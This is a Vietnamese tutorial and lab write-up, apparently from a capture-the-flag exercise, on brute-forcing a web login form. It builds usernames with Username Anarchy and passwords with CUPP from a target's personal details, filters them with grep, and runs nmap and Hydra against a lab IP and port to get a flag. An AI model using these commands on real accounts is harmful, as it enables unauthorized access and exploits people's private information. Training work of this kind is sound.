### **Sử dụng các từ điển tùy chỉnh trong các cuộc tấn công brute-force:**

Trong các cuộc tấn công brute-force, việc sử dụng các **từ điển tùy chỉnh (custom wordlists)** giúp tăng hiệu quả và giảm thời gian so với việc sử dụng các từ điển có sẵn như **rockyou** hay **SecLists**, vì chúng được tạo ra dựa trên thông tin riêng biệt của mục tiêu, làm tăng khả năng thành công của cuộc tấn công.

#### **1. Quét và Tạo Username với Username Anarchy**:

Khi đối mặt với một mục tiêu cụ thể như **Jane Smith**, việc tạo ra một danh sách tên người dùng từ các tên cơ bản và kết hợp những kiểu phổ biến có thể bao gồm:

* **Kết hợp tên và họ**: janesmith, smithjane
* **Sử dụng tên viết tắt**: js, j.s., s.j., v.v.
* **Các biến thể khác**: sử dụng leetspeak, ký tự đặc biệt, hoặc thậm chí kết hợp sở thích cá nhân vào tên người dùng.

**Công cụ: `Username Anarchy`** giúp tạo ra một danh sách các tên người dùng có thể từ những thông tin cơ bản (tên, họ).
```bash
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Kết quả sẽ là một danh sách tên người dùng đa dạng, từ đó có thể sử dụng trong cuộc tấn công brute-force.

#### **2. Tạo Mật Khẩu Tùy Chỉnh với CUPP**:

**CUPP** (Common User Password Profiler) là công cụ giúp tạo ra các từ điển mật khẩu tùy chỉnh, sử dụng thông tin cá nhân về mục tiêu như:

* **Tên** và **họ**
* **Ngày sinh**, **nickname**, **sở thích**, **mối quan hệ**, **số điện thoại**, v.v.

CUPP sẽ tạo ra một danh sách mật khẩu có thể bao gồm các biến thể từ thông tin cá nhân, như:

* **Tên gốc và chữ hoa**: jane, Jane
* **Ngày sinh**: jane1990, smith1212
* **Kết hợp các ký tự đặc biệt**: jane!, smith@, v.v.

Để tạo danh sách mật khẩu, ta có thể nhập thông tin vào CUPP trong chế độ tương tác:

```bash
cupp -i
```

Sau khi tạo mật khẩu, có thể lọc ra các mật khẩu phù hợp với chính sách của hệ thống, ví dụ như yêu cầu có ít nhất một ký tự hoa, một ký tự thường, một số, và hai ký tự đặc biệt.

Ví dụ lọc mật khẩu:

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

#### **3. Sử dụng Hydra để Tấn Công Brute-Force**:

Sau khi có danh sách tên người dùng và mật khẩu, ta sử dụng **Hydra** để thực hiện tấn công brute-force vào form đăng nhập của trang web. Hydra sẽ thử tất cả các kết hợp tên người dùng và mật khẩu từ danh sách đã tạo.

Ví dụ lệnh:

```bash
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

Kết quả sẽ trả về **cặp tên người dùng và mật khẩu hợp lệ** nếu tìm thấy. Sau đó, người tấn công có thể đăng nhập vào trang web với **credentials** đã phát hiện và lấy cờ.

---

### **Kết luận**:

Các công cụ như **Username Anarchy** và **CUPP** giúp tạo ra các từ điển tùy chỉnh từ thông tin cá nhân của mục tiêu, làm tăng khả năng thành công của các cuộc tấn công brute-force. Sau đó, kết hợp với **Hydra** để thử tất cả các kết hợp từ điển này vào trang web mục tiêu, kẻ tấn công có thể tìm ra mật khẩu và chiếm quyền truy cập vào tài khoản của mục tiêu.
# ** Thực hành**
nmap -sV 83.136.253.59 -p 49534
./username-anarchy Jane Smith > usernames.txt
cupp -i (enter osint infomation)
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
hydra -L usernames.txt -P jane-filtered.txt 83.136.253.59 -s 49534 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
![alt text](image.png)
Log on and get flag
